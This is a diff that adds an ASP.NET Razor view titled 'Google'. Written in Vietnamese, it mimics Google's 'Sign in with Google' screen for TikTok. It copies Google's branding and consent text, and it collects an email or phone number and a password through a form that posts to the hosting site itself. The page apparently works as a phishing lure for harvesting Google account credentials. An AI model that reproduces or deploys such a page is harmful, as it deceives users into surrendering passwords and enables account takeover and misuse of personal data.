@@ -1,0 +1,117 @@
+﻿@{ Layout = null; }
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Google</title>
+</head>
+<body>
+    <div>
+        @using (Html.BeginForm())
+        {
+            <table align="center">
+                <tr>
+                    <td align="left" style="text-decoration: none !important">
+                        <h4 style="font-family: Arial; color: grey">
+                            <img src="~/Content/image/GG.png"
+                                 alt="Thumbnail"
+                                 width="3%" />
+                            <a href="~/Views/Home/DangKy"
+                               style="text-decoration: none;color: rgb(119, 116, 116) !important">Đăng nhập bằng Google</a>
+                        </h4>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <table align="center">
+                            <tr>
+                                <td>
+                                    <table align="center" style="width: 390px">
+                                        <tr>
+                                            <td align="center">
+                                                <img src="~/Content/image/logotiktok.png"
+                                                     alt="Thumbnail"
+                                                     width="20%" />
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <table align="left" width="390px">
+                                        <tr a>
+                                            <td align="center">
+                                                <h2 style="
+                                                text-align: center;
+                                                padding-top: 30px;
+                                                font-weight: bold;
+                                                font-family: Arial">
+                                                     Đăng nhập
+                                                </h2>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="center" style="text-decoration: none !important">
+                                    <h4 style="font-family: Arial; color: grey">
+                                        để tiếp tục tới
+                                        <a href="~/Views/Home/DangKy"
+                                           style="text-decoration: none; color: rgb(0, 119, 255) !important;">TikTok</a>
+                                    </h4>
+                                </td>
+                            </tr>
+                        </table>
+                        <table align="center" style="width: 390px">
+                            <tr>
+                                <td style="width: 380px">
+                                    <input type="text"
+                                           placeholder="Email hoặc số điện thoại"
+                                           name="mail"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="width: 380px; padding-top: 10px; padding-bottom: 20px">
+                                    <input type="password"
+                                           placeholder="Mật khẩu"
+                                           name="psw"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <table align="left" width="390px">
+                                    <tr>
+                                        <td align="center">
+                                            <h4 style="text-align: left;
+                                               font-family:Arial;
+                                               color: gray">
+                                                Để tiếp tục, Google sẽ chia sẻ tên, địa chỉ email, tùy chọn ngôn ngữ và ảnh hồ sơ của bạn với TikTok. Trước khi sử dụng TikTok, bạn có thể xem
+                                                <a href="~/Views/Home/DangKy"
+                                                   style="text-decoration: none;color: rgb(0, 119, 255) !important;">chính sách quyền riêng tư </a>và điều khoản dịch vụ của ứng dụng này.
+                                            </h4>
+                                        </td>
+                                    </tr>
+                                </table>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <input type="submit" value="Tiếp theo" style="width: 380px; height: 55px !important; 
+                                                                           background-color: #078bf7 !important; 
+                                                                           border: none !important; font-weight: bold; color:white" />
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        }
+        </div>
+</body>
+</html>
